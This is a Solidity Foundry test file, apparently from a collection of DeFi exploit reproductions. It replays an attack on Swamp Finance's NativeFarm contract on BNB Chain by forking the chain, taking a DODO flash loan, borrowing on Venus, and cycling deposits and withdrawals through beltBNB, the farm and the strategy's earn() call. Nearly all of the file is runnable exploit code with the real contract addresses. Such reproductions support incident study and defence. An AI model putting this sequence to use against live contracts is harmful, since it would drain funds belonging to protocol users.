// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Unclear
// Attacker : https://bscscan.com/address/0xfe2105e1317dfd6ed3887bf7882977c03cfebb7c
// Attack Contract : https://bscscan.com/address/0x22ad9eef79615a1592e969bdf7b238a07281ab80
// Vulnerable Contract : https://bscscan.com/address/0x33adbf5f1ec364a4ea3a5ca8f310b597b8afdee3
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x13e75878a21af9a9b2207f5d9e18f19a43083a9ffbac36df5a7d4d67a52c164f

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x33adbf5f1ec364a4ea3a5ca8f310b597b8afdee3#code#L1609

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1720373044517208261
// Hacking God :

interface IbeltBNB {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function deposit(uint256 _amount, uint256 _minShares) external;

    function withdraw(uint256 _shares, uint256 _minAmount) external;
}

interface INativeFarm {
    function deposit(uint256 _pid, uint256 _wantAmt) external;

    function withdraw(uint256 _pid, uint256 _wantAmt) external;
}

interface IStrategyBeltToken {
    function earn() external;
}

contract SwampFinanceExploit is Test {
    IWBNB private constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IbeltBNB private constant beltBNB = IbeltBNB(0xa8Bb71facdd46445644C277F9499Dd22f6F0A30C);
    DVM private constant DPPOracle = DVM(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    ICointroller private constant VenusDistribution = ICointroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    ICErc20Delegate private constant vUSDT = ICErc20Delegate(payable(0xfD5840Cd36d94D7229439859C0112a4185BC0255));
    crETH private constant vBNB = crETH(payable(0xA07c5b74C9B40447a954e1466938b865b6BBea36));
    INativeFarm private constant NativeFarm = INativeFarm(0x33AdBf5f1ec364a4ea3a5CA8f310B597B8aFDee3);
    IStrategyBeltToken private constant StrategyBeltToken =
        IStrategyBeltToken(0xdA937DDD1F2bd57F507f5764a4F9550c750F7B31);

    uint256 private constant blocknumToForkFrom = 33_112_358;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(beltBNB), "beltBNB");
        vm.label(address(DPPOracle), "DPPOracle");
        vm.label(address(VenusDistribution), "VenusDistribution");
        vm.label(address(vUSDT), "vUSDT");
        vm.label(address(vBNB), "vBNB");
        vm.label(address(NativeFarm), "NativeFarm");
        vm.label(address(StrategyBeltToken), "StrategyBeltToken");
    }

    function testExploit() public {
        deal(address(this), 0);
        // In the begining transfer tokens from exploiter to attack contract
        deal(address(WBNB), address(this), 1e15);
        deal(address(BUSDT), address(this), 155_049_710_721_328_089);
        deal(address(beltBNB), address(this), 1_272_113_372_028_660);

        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        DPPOracle.flashLoan(3_100e18, 150_000e18, address(this), bytes("_"));

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        approveAll();
        address[] memory vTokens = new address[](2);
        vTokens[0] = address(vUSDT);
        vTokens[1] = address(vBNB);
        VenusDistribution.enterMarkets(vTokens);

        uint256 cachedBUSDTbalance = BUSDT.balanceOf(address(this));
        vUSDT.mint(cachedBUSDTbalance);
        vBNB.borrow(500 ether);
        WBNB.deposit{value: address(this).balance}();
        beltBNB.deposit(WBNB.balanceOf(address(this)), 1);
        NativeFarm.deposit(135, beltBNB.balanceOf(address(this)));
        StrategyBeltToken.earn();
        NativeFarm.withdraw(135, type(uint256).max);
        beltBNB.withdraw(beltBNB.balanceOf(address(this)), 1);
        WBNB.withdraw(500 ether);
        vBNB.repayBorrow{value: 500 ether}();
        vUSDT.redeemUnderlying(cachedBUSDTbalance);

        WBNB.transfer(address(DPPOracle), baseAmount);
        BUSDT.transfer(address(DPPOracle), quoteAmount);
    }

    receive() external payable {}

    function approveAll() private {
        BUSDT.approve(address(vUSDT), type(uint256).max);
        WBNB.approve(address(beltBNB), type(uint256).max);
        beltBNB.approve(address(NativeFarm), type(uint256).max);
        beltBNB.approve(address(beltBNB), type(uint256).max);
    }
}
